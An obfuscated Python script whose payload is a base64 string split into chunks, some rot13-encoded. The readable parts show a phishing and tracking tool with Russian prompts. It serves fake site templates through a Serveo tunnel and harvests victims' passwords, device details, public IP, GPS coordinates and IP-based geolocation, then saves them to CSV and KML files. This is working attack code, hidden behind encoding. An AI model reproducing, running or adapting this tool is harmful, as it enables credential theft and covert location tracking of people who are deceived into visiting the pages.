#bafomet

import base64, codecs
magic = 'IyEgL3Vzci9iaW4vZW52IHB5dGhvbgojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQpSID0gJ1wwMzNbMzFtJyAgICMgUmVkCkcgPSAnXDAzM1sxOzM0bScgIyBCbHVlCkMgPSAnXDAzM1sxOzMybScgIyBHcmVlbgpXID0gJ1wwMzNbMG0nICAgICMgd2hpdGUKTyA9ICdcMDMzWzQ1bScgICAjIFB1cnBsZQpOID0gJ1wwMzNbMTszN20nICMgV2hpdGUKQiA9ICdcMDMzWzE7MzRtJyAjIEJsdWUKCmZyb20gc2h1dGlsIGltcG9ydCB3aGljaApmcm9tIHBpcC5fdmVuZG9yLmRpc3RsaWIuY29tcGF0IGltcG9ydCByYXdfaW5wdXQKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgb3MKb3Muc3lzdGVtKCdjbGVhcicpCgoKcGtncyA9IFsncHl0aG9uMycsICdwaXAzJywgJ3BocCcsICdzc2gnXQppbnN0ID0gVHJ1ZQpmb3IgcGtnIGluIHBrZ3M6CglwcmVzZW50ID0gd2hpY2gocGtnKQoJaWYgcHJlc2VudCA9PSBOb25lOgoJCXByaW50KFIgKyAnWy1dICcgKyBXICsgcGtnICsgQyArICcgaXMgbm90IEluc3RhbGxlZCEnKQoJCWluc3QgPSBGYWxzZQoJZWxzZToKCQlwYXNzCmlmIGluc3QgPT0gRmFsc2U6CglleGl0KCkKZWxzZToKCXBhc3MKaW1wb3J0IGdldHBhc3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmltcG9ydCBjc3YKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQganNvbgppbXBvcnQgYXJncGFyc2UKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzIGFzIHN1YnAKCnBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKCkKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXMnLCAnLS1zdWJkb21haW4nLCBoZWxwPSdQcm92aWRlIFN1YmRvbWFpbiBmb3IgU2VydmVvIFVSTCAoIE9wdGlvbmFsICknKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctaycsICctLWttbCcsIGhlbHA9J1Byb3ZpZGUgS01MIEZpbGVuYW1lICggT3B0aW9uYWwgKScpCnBhcnNlci5hZGRfYXJndW1lbnQoJy10JywgJy0tdHVubmVsJywgaGVscD0nU3BlY2lmeSBUdW5uZWwgTW9kZSBbIEF2YWlsYWJsZSA6IG1hbnVhbCBdJykKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCAnLS1wb3J0JywgdHlwZT1pbnQsIGRlZmF1bHQ9ODA4MCwgaGVscD0nUG9ydCBmb3IgV2ViIFNlcnZlciBbIERlZmF1bHQgOiA4MDgwIF0nKQoKYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKc3ViZG9tID0gYXJncy5zdWJkb21haW4Ka21sX2ZuYW1lID0gYXJncy5rbWwKdHVubmVsX21vZGUgPSBhcmdzLnR1bm5lbApwb3J0ID0gYXJncy5wb3J0Cgpyb3cgPSBbXQppbmZvID0gJycKcmVzdWx0ID0gJycKb3Muc3lzdGVtKCdjbGVhcicpCm9zLnN5c3RlbSgiY2QgdGVtcGxhdGUvYmFubmVyO3B5dGhvbjIgYmFubmVyLnB5IikKZGVmIGJhbm5lcigpOgoJcHJpbnQoIiDQoNC10LbQuNC8INGE0LjRiNC40L3Qs9CwIikKCQpkZWYgdHVubmVsX3NlbGVjdCgpOgoJaWYgdHVubmVsX21vZGUgPT0gTm9uZToKCQlzZXJ2ZW8oKQoJZWxpZiB0dW5uZWxfbW9kZSA9PSAnbWFudWFsJzoKCQlwcmludChHICsgJycgKyBDICsgJycgKyBXICsgJ1xuJykKCWVsc2U6CgkJcHJpbnQoUiArICdbICsgXScgKyBDICsgJyDQndC10LTQtdC50YHRgtCy0LjRgtC10LvRjNC90YvQuSDQstGL0LHRgNCw0L3QvdGL0Lkg0YDQtdC20LjQvCDRgtGD0L3QvdC10LvRjywg0J/RgNC+0LLQtdGA0YzRgtC1IE5ncm9rLiAgWy1oLCAtLWhlbHBdJyArIFcgKyAnXG4nKQoJCWV4aXQoKQoKZGVmIHRhbXBsYXRlX3NlbGVjdCgpOgoJZ2xvYmFsIHNpdGUsIGluZm8sIHJlc3VsdAoJcHJpbnQoUiArICcgWyArIF0nICsgQyArICcg0JLRi9Cx0LXRgNC40YLQtSDQvtC/0YbQuNGOIDogJyArIEMgKyAnXG4nKQoJCgl3aXRoIG9wZW4oJ3RhbXBsYXRlL3RlbXBsYXRlcy5qc29uJywgJ3InKSBhcyB0ZW1wbDoKCQl0ZW1wbF9pbmZvID0gdGVtcGwucmVhZCgpCgkKCXRlbXBsX2pzb24gPSBqc29uLmxvYWRzKHRlbXBsX2luZm8pCgkKCSMjIyMjCgkjZWQuIENvZGUgbDNlODYKCWxpc3RfdGVtcCA9IFtdCglmb3IgaXRlbSBpbiB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXToKCQluYW1lID0gaXRlbVsnbmFtZSddCgkJaWYgbGVuKG5hbWUpIDwgNTA6CgkJCW5hbV9wcm9iID0gNTAgLSBsZW4obmFtZSkKCQkJcHJvYmVscyA9ICcgJyAqIGludChuYW1fcHJvYikKCQkJCgkJCWluZGV4ID0gc3RyKHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddLmluZGV4KGl0ZW0pKQoJCQluYW1faW5kZXggPSAnJwoJCQlpZiBsZW4oaW5kZXgpID09IDE6CgkJCSAgICBuYW1faW5kZXggPSAnMCcgKyBpbmRleAoJCQllbHNlOgoJCQkgICAgbmFtX2luZGV4ID0gaW5kZXgKCQkJCgkJCXJlc2FsdCA9IEcgKyAnIFsge30gXSAnLmZvcm1hdChuYW1faW5kZXgpICsgQyArICcge30ge30nLmZvcm1hdChuYW1lLCBwcm9iZWxzKSArIFcKCQkJbGlzdF90ZW1wLmFwcGVuZChyZXNhbHQpCgkJCgluYW1fY2Fsb21ucyA9IDMKCWZvciBpbmRleCBpbiByYW5nZSgwLCBsZW4obGlzdF90ZW1wKSwgbmFtX2NhbG9tbnMpOgoJCXJlc2FsdCA9IGxpc3RfdGVtcFtpbmRleDppbmRleCArIG5hbV9jYWxvbW5zXQoJCXByaW50KCcgJy5qb2luKG1hcChzdHIsIHJlc2FsdCkpKQoJIyMjIyMjIyMjIyMjCglwcmludCgiIikKCXNlbGVjdGVkID0gaW50KGlucHV0KFIgKyAiIFsiICsgQyArICIg0JLQstC10LTQuNGC0LUg0L3QvtC80LXRgCDRgdCw0LnRgtCwICIgKyBSICsiXSA6IiArIFcpKQoJCgl0cnk6CgkJc2l0ZSA9IHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddW3NlbGVjdGVkXVsnZGlyX25hbWUnXQoJZXhjZXB0IEluZGV4RXJyb3I6CgkJcHJpbnQoJ1xuJyArIFIgKyAnWy1dJyArIEMgKyAnIEludmFsaWQgSW5wdXQhJyArIFcgKyAnXG4nKQoJCXN5cy5leGl0KCkKCQoJcHJpbnQoJ1xuJyArIEcgKyAnIFsgKyBdJyArIEMgKyAnINCX0LDQs9GA0YPQt9C60LAge30g0J7QttC40LTQsNC50YLQtS4uLicuZm9ybWF0KHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddW3NlbGVjdGVkXVsnbmFtZSddKSArIFcpCglwcmlu'
love = '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'
god = 'tNC+0Lkg0L/QsNC/0LrQtSDQsdGD0LTRg9GCINC+0YLQvtCx0YDQsNC20LDRgtGM0YHRjyDQv9Cw0YDQvtC70LgsINC/0L4g0L3QsNC30LLQsNC90LjRjiwg0LTRgNGD0LPQuNGFINC+0L/QvtCy0LXRidC10L3QuNC5INC90LUg0LHRg9C00LXRgi5cbiAgICAgICDQutCw0Log0YLQvtC70YzQutC+INC20LXRgNGC0LLQsCDQstCy0LXQtNC10YIg0LTQsNC90L3Ri9C1LCDQvtC90Lgg0LHRg9C00YPRgiDQvdC1INCyINGC0LXRgNC80LjQvdCw0LvQtSwg0LAg0LIg0L/QsNC/0LrQtSDQsiDQtNC+0LrRg9C80LXQvdGC0LUg0YEg0L3QsNC30LLQsNC90LjQtdC8IHBhc3N3b3JkJyArIFcgKyAnXG4nKQoJCQlwcmludCgnXG4nICsgRyArICcgWyArIF0nICsgUiArICcg0K3RgtC+INCx0LXRgtCwINCy0LXRgNC40LDQvdGCINGE0LjRiNC40L3QsyDQvNC+0LTQsC4nICsgVyArICdcbicpCgkJCXByaW50KCdcbicgKyBHICsgJyBbICsgXScgKyBSICsgJyDQlNC70Y8g0LLRi9GF0L7QtNCwINC90LDQttC80LggQ3RybCArIEMnICsgVyArICdcbicpCgkJCXByaW50KCdcbicgKyBHICsgJyBbICsgXScgKyBSICsgJyDQldGB0LvQuCDQsdGD0LTQtdGCINCy0YvQstC+0LTQuNGC0YwsINCh0YLQsNGC0YPRgSA0MDQsINC/0LjQt9C00LXQtiDQstGB0LUsINCy0YHQtSDRgNCw0LHQvtGC0LDQtdGCLCA0INGH0LDRgSDQvdC+0YfQuCwg0YHQv9Cw0YLRjCDRhdC+0YfRgycgKyBXICsgJ1xuJykKCQkJcHJpbnRlZCA9IFRydWUKCQlpZiBzaXplID4gMDoKCQkJbWFpbigpCgpkZWYgbWFpbigpOgoJZ2xvYmFsIGluZm8sIHJlc3VsdCwgcm93LCB2YXJfbGF0LCB2YXJfbG9uCgl0cnk6CgkJcm93ID0gW10KCQl3aXRoIG9wZW4gKGluZm8sICdyJykgYXMgZmlsZTI6CgkJCWZpbGUyID0gZmlsZTIucmVhZCgpCgkJCWpzb24zID0ganNvbi5sb2FkcyhmaWxlMikKCQkJZm9yIHZhbHVlIGluIGpzb24zWydkZXYnXToKCgkJCQl2YXJfb3MgPSB2YWx1ZVsnb3MnXQoJCQkJdmFyX3BsYXRmb3JtID0gdmFsdWVbJ3BsYXRmb3JtJ10KCQkJCXRyeToKCQkJCQl2YXJfY29yZXMgPSB2YWx1ZVsnY29yZXMnXQoJCQkJZXhjZXB0IFR5cGVFcnJvcjoKCQkJCQl2YXJfY29yZXMgPSAnTm90IEF2YWlsYWJsZScKCQkJCXZhcl9yYW0gPSB2YWx1ZVsncmFtJ10KCQkJCXZhcl92ZW5kb3IgPSB2YWx1ZVsndmVuZG9yJ10KCQkJCXZhcl9yZW5kZXIgPSB2YWx1ZVsncmVuZGVyJ10KCQkJCXZhcl9yZXMgPSB2YWx1ZVsnd2QnXSArICd4JyArIHZhbHVlWydodCddCgkJCQl2YXJfYnJvd3NlciA9IHZhbHVlWydicm93c2VyJ10KCQkJCXZhcl9pcCA9IHZhbHVlWydpcCddCgoJCQkJcm93LmFwcGVuZCh2YXJfb3MpCgkJCQlyb3cuYXBwZW5kKHZhcl9wbGF0Zm9ybSkgCgkJCQlyb3cuYXBwZW5kKHZhcl9jb3JlcykgCgkJCQlyb3cuYXBwZW5kKHZhcl9yYW0pIAoJCQkJcm93LmFwcGVuZCh2YXJfdmVuZG9yKQoJCQkJcm93LmFwcGVuZCh2YXJfcmVuZGVyKQoJCQkJcm93LmFwcGVuZCh2YXJfcmVzKQoJCQkJcm93LmFwcGVuZCh2YXJfYnJvd3NlcikKCQkJCXJvdy5hcHBlbmQodmFyX2lwKQoKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcg0JjQvdGE0L7RgNC80LDRhtC40Y8g0L4g0YPRgdGC0YDQvtC50YHRgtCy0LUuLi4gOiAnICsgUiArICdcbicpCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIE9TICAgICAgICAgOiAnICsgVyArIHZhcl9vcykKCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcgUGxhdGZvcm0gICA6ICcgKyBXICsgdmFyX3BsYXRmb3JtKQoJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyBDUFUgQ29yZXMgIDogJyArIFcgKyB2YXJfY29yZXMpCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIFJBTSAgICAgICAgOiAnICsgVyArIHZhcl9yYW0pCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIEdQVSBWZW5kb3IgOiAnICsgVyArIHZhcl92ZW5kb3IpCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIEdQVSAgICAgICAgOiAnICsgVyArIHZhcl9yZW5kZXIpCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIFJlc29sdXRpb24gOiAnICsgVyArIHZhcl9yZXMpCgkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnIEJyb3dzZXIgICAgOiAnICsgVyArIHZhcl9icm93c2VyKQoJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyBQdWJsaWMgSVAgIDogJyArIFcgKyB2YXJfaXApCgkJCQoKCQkJCXJxc3QgPSByZXF1ZXN0cy5nZXQoJ2h0dHA6Ly9mcmVlLmlwd2hvaXMuaW8vanNvbi97fScuZm9ybWF0KHZhcl9pcCkpCgkJCQlzYyA9IHJxc3Quc3RhdHVzX2NvZGUKCgkJCQlpZiBzYyA9PSAyMDA6CgkJCQkJZGF0YSA9IHJxc3QudGV4dAoJCQkJCWRhdGEgPSBqc29uLmxvYWRzKGRhdGEpCgkJCQkJdmFyX2NvbnRpbmVudCA9IHN0cihkYXRhWydjb250aW5lbnQnXSkKCQkJCQl2YXJfY291bnRyeSA9IHN0cihkYXRhWydjb3VudHJ5J10pCgkJCQkJdmFyX3JlZ2lvbiA9IHN0cihkYXRhWydyZWdpb24nXSkKCQkJCQl2YXJfY2l0eSA9IHN0cihkYXRhWydjaXR5J10pCgkJCQkJdmFyX29yZyA9IHN0cihkYXRhWydvcmcnXSkKCQkJCQl2YXJfaXNwID0gc3RyKGRhdGFbJ2lzcCddKQoKCQkJCQlyb3cuYXBwZW5kKHZhcl9jb250aW5lbnQpCgkJCQkJcm93LmFwcGVuZCh2YXJfY291bnRyeSkKCQkJCQlyb3cuYXBwZW5kKHZhcl9yZWdpb24pCgkJCQkJcm93LmFwcGVuZCh2YXJfY2l0eSkKCQkJCQlyb3cuYXBwZW5kKHZhcl9vcmcpCgkJCQkJcm93LmFwcGVuZCh2YXJfaXNwKQoKCQkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnINCa0L7QvdGC0LjQvdC10L3RgiAgOiAnICsgVyArIHZhcl9jb250aW5lbnQpCgkJCQkJcHJpbnQoRyArICdbICsgXScgKyBDICsgJyDQodGC0YDQsNC90LAgICAgOiAnICsgVyArIHZhcl9jb3VudHJ5KQoJCQkJCXByaW50KEcgKyAnWyArIF0nICsgQyArICcg0KDQtdCz0LjQvtC9ICAgICA6ICcgKyBXICsgdmFyX3JlZ2lvbikKCQkJCQlwcmludChHICsgJ1sgKyBdJyArIEMgKyAnINCT0L7RgNC+0LQgICAgICAgOiAnICsgVyAr'
destiny = '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